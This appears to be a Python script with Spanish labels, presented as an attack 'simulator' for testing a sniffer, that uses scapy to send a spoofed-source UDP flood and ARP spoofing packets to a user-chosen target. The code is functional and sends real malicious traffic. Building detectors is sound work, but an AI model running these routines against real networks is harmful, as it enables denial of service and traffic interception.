
from scapy.all import IP, UDP, ARP, send
import random
import time

class SimuladorAtaques:
    def __init__(self, ip_objetivo, ip_router=None):
        self.ip_objetivo = ip_objetivo
        self.ip_router = ip_router or "192.168.1.1"

    def udp_flood(self, cantidad=1000):
        print(f"Enviando {cantidad} paquetes UDP a {self.ip_objetivo}...")
        for _ in range(cantidad):
            pkt = IP(dst=self.ip_objetivo, src=f"10.0.0.{random.randint(1, 254)}") /                   UDP(dport=random.randint(1024, 65535))
            send(pkt, verbose=False)
        print("UDP Flood simulado completado.")

    def arp_spoofing(self, mac_falsa="11:22:33:44:55:66", repeticiones=10):
        print(f"Enviando {repeticiones} paquetes ARP spoofing a {self.ip_objetivo} haciéndose pasar por {self.ip_router}...")
        pkt = ARP(op=2, psrc=self.ip_router, pdst=self.ip_objetivo,
                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_falsa)
        send(pkt, count=repeticiones, verbose=False)
        print("ARP spoofing simulado completado.")

    def menu(self):
        while True:
            print("\n--- Simulador de Tráfico Malicioso ---")
            print("1. Simular UDP Flood")
            print("2. Simular ARP Spoofing")
            print("3. Salir")
            opcion = input("Selecciona una opción: ")

            if opcion == "1":
                self.udp_flood()
            elif opcion == "2":
                self.arp_spoofing()
            elif opcion == "3":
                print("Saliendo...")
                break
            else:
                print("Opción no válida. Intenta de nuevo.")

if __name__ == "__main__":
    objetivo = input("Ingresa la IP del objetivo (Sniffer): ")
    router = input("Ingresa la IP del router (opcional, enter para usar 192.168.1.1): ") or None
    sim = SimuladorAtaques(ip_objetivo=objetivo, ip_router=router)
    sim.menu()
